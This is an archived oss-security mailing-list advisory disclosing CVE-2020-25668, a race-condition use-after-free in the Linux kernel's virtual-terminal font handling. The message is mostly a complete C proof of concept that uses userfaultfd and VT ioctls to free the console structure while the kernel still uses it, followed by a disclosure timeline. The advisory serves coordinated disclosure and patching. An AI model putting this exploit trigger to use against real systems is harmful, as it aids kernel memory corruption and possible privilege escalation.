X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["4685" "Friday" "30" "October" "2020" "14:29:04" "+0800" "Minh Yuan" "yuanmingbuaa@gmail.com" "<CAH5WSp7NWysxDNpqHeN4+_edC9A8NQfp4+P_PuPNaueQgZQ4tw@mail.gmail.com>" "158" "[oss-security] CVE-2020-25668: Linux kernel concurrency use-after-free in vt" nil nil nil "10" "2020103006:29:04" "[oss-security] CVE-2020-25668: Linux kernel concurrency use-after-free in vt" (number mark "U       yuanmingbuaa Oct 30  158/4685  " thread-indent "\"[oss-security] CVE-2020-25668: Linux kernel concurrency use-after-free in vt\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] CVE-2020-25668: Linux kernel concurrency use-after-free in vt" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 21710 invoked by uid 550); 30 Oct 2020 12:40:17 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 10196 invoked from network); 30 Oct 2020 06:29:27 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20161025;
        h=mime-version:from:date:message-id:subject:to:cc;
        bh=mTB06LEbOnXaVVBBNOmHqnAcDP28Wx/GciQJAGxGJSY=;
        b=HFYzcpdiPiXGiv37dBKi/3dtvmru92SI5KOb8JXahBCJs1HHA86rsbxtWMVgKkw3ft
         J77OAO9pYshkck6z7VCSGrkqIXJIgu3N1vlzhdq2ZPsXqOYya12/MGRn6Dcms53rwoOS
         rgzsr3vliE7wKSmjxTtL8OteDec3G+RxdqPDsICVkpzo4aBXRG7Y9GThtB+PxNYgNdPI
         NY1S8I4HiyW4K917sffh0R14viaoWMyXmACBxkCz3kE1bOz0XE1nMpRqzsfBlveLC1Z4
         gVYrEf8lIQgOj9N7hK1JSqBsYaMZsdbu7pgIQU4+OWBkRBRtZe70G8B7qldz+xaseiwj
         WH2g==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:mime-version:from:date:message-id:subject:to:cc;
        bh=mTB06LEbOnXaVVBBNOmHqnAcDP28Wx/GciQJAGxGJSY=;
        b=atpPmU745wGDTAh+zJ/22Z12RXn4sXx1xP/SOp03deM4T7uhTvkFUP57aaryKng3Bd
         v3auCgRYAdgHLBXD7JUM6HY3D4H+rt/KEJ6cUMwsoTIStbgjhI/fh2SbjoYw8ZwNG6+Z
         YuUYAGY08v1ZG/i5fIelroiUPeWvrYCtiPR0gHNYcJOkDnjM638Ecn4TzFfieVpu9C26
         qol8E5tLIB1xLuaCX+Yn9Xq8d8nIhOLLkfJ+m+bQq7YtE6bG7u5tQokWy7zXzpT2pQc9
         cS64A+5BNH7qLf1kCH48pNyXR8UHuw2zgwgpjFfcVK8oaayccaxvnkH2tP3tRDLanDJB
         04ag==
X-Gm-Message-State: AOAM532gz0/GZ1PuH3sekCOg4/Jx3m7RrlfunJvhTY0UvWi8A5SwiMEN
	04m9Xc25d8s7wGyxfENL27PZw6zDWteMUpwyJCRbRfZRAQQb+Q==
X-Google-Smtp-Source: ABdhPJxysNPINMc7DGx1QnBrtNFeDgAgO1+TPg9v10iXYiAM5n9mz6edX61WAB+RFUwXyVv/HyS0Geo+dvcM4XVvar8=
X-Received: by 2002:a17:906:26c2:: with SMTP id u2mr919485ejc.529.1604039355671;
 Thu, 29 Oct 2020 23:29:15 -0700 (PDT)
MIME-Version: 1.0
From: Minh Yuan <yuanmingbuaa@gmail.com>
Date: Fri, 30 Oct 2020 14:29:04 +0800
Message-ID: <CAH5WSp7NWysxDNpqHeN4+_edC9A8NQfp4+P_PuPNaueQgZQ4tw@mail.gmail.com>
To: oss-security@lists.openwall.com
Cc: nopitydays@gmail.com
Content-Type: multipart/alternative; boundary="0000000000000028d305b2dd84b5"
Subject: [oss-security] CVE-2020-25668: Linux kernel concurrency use-after-free in vt

--0000000000000028d305b2dd84b5
Content-Type: text/plain; charset="UTF-8"

Hi,

We recently discovered a uaf read in *con_font_op* in the latest kernel
(v5.9.2 for now). The root cause of this vulnerability is that there exists
a race in the global variable "*fg_console*", and the commit ca4463bf
<https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=ca4463bf8438b403596edd0ec961ca0d4fbe0220>
can't
handle this issue.

Specifically, after obtaining "vc_cons[fg_console]" by call *do_fontx_ioctl*,
we can use *ioctl$VT_ACTIVATE* to change "fg_console" and use
*ioctl$VT_DISALLOCATE* to free the old "vc_cons[fg_console]" obtained in
*do_fontx_ioctl*. As a result, the access to vc in  *con_font_op* will
cause a uaf.


To reproduce this concurrency bug stably, I use "userfaultfd" to handle the
order of "free" and "use". This is my PoC (it needs the privilege to access
tty to trigger this bug.) :

// author by ziiiro@thu
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <linux/kd.h>
#include <linux/vt.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <pthread.h>
#include <errno.h>
#include <stdlib.h>
#include <signal.h>
#include <sys/syscall.h>
#include <linux/userfaultfd.h>
#include <poll.h>
#include <linux/prctl.h>
#include <stdint.h>
#include <unistd.h>

#define errExit(msg)    do { perror(msg); exit(EXIT_FAILURE); \
                       } while (0)
int fd;
static int page_size;

static void *fault_handler_thread(void *arg) {
  unsigned long value;
  static struct uffd_msg msg;
  long uffd;
  static char *page = NULL;
  struct uffdio_copy uffdio_copy;
  int len, i;
  if (page == NULL) {
    page = mmap(NULL, page_size, PROT_READ | PROT_WRITE,
                MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (page == MAP_FAILED) errExit("mmap (userfaultfd)");
  }
  uffd = (long)arg;

  for(;;) {
    struct pollfd pollfd;
    pollfd.fd = uffd;
    pollfd.events = POLLIN;
    len = poll(&pollfd, 1, -1);


    read(uffd, &msg, sizeof(msg));
    printf("    flags = 0x%lx\n", msg.arg.pagefault.flags);
    printf("    address = 0x%lx\n", msg.arg.pagefault.address);
   // change fg_console to 13
    ioctl(fd, VT_ACTIVATE, 13);
    ioctl(fd, VT_DISALLOCATE, 0);
    // return to kernel-land
    uffdio_copy.src = (unsigned long)page;
    uffdio_copy.dst = (unsigned long)msg.arg.pagefault.address &
~(page_size - 1);
    uffdio_copy.len = page_size;
    uffdio_copy.mode = 0;
    uffdio_copy.copy = 0;
    if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
        errExit("ioctl: UFFDIO_COPY");

  }
}

void setup_pagefault(void *addr, unsigned size) {
  long uffd;
  pthread_t th;
  struct uffdio_api uffdio_api;
  struct uffdio_register uffdio_register;
  int s;
  // new userfaulfd

  uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
  if (uffd == -1) errExit("userfaultfd");
  // enabled uffd object
  uffdio_api.api = UFFD_API;
  uffdio_api.features = 0;
  if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1) errExit("ioctl:
UFFDIO_API");
  // register memory address
  uffdio_register.range.start = (unsigned long)addr;
  uffdio_register.range.len   = size;
  uffdio_register.mode        = UFFDIO_REGISTER_MODE_MISSING;
  if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1) errExit("ioctl:
UFFDIO_REGITER");
  // monitor page fault
  s = pthread_create(&th, NULL, fault_handler_thread, (void*)uffd);
  if (s != 0) errExit("pthread_create");
}


int main(int argc, char *argv[])
{
    fd = open("/dev/tty1", O_RDWR);
    struct consolefontdesc cfdarg;
    page_size = sysconf(_SC_PAGE_SIZE);
    void *addr = (void*)mmap((void*)0x233000,
                        page_size * 2,
                        PROT_READ | PROT_WRITE,
                        MAP_FIXED | MAP_PRIVATE | MAP_ANON,
                        -1, 0);
    if ((unsigned long)addr != 0x233000)
        errExit("mmap (0x233000)");

    setup_pagefault(addr, page_size);
    cfdarg.charcount = 256;
    cfdarg.charheight = 8;
    cfdarg.chardata = addr;
    // change fg_console to 10
    ioctl(fd, VT_ACTIVATE, 10);
    ioctl(fd, PIO_FONTX, &cfdarg);

    return 0;
}

I change "fg_console" to *10* and *13* respectively, you can change it to
any other appropriate number.

In addition to "con_font_op", I think other functions that read or write
vc_cons[fg_console]  will also have the same issue.

Timeline:
* 10.23.20 - Vulnerability reported to security@kernel.org and
linux-distros@vs.openwall.org.
* 10.27.20 - CVE-2020-25668 assigned.
* 10.30.20 - Vulnerability opened.

Regards,

Yuan Ming, Bodong Zhao from Tsinghua University

--0000000000000028d305b2dd84b5--
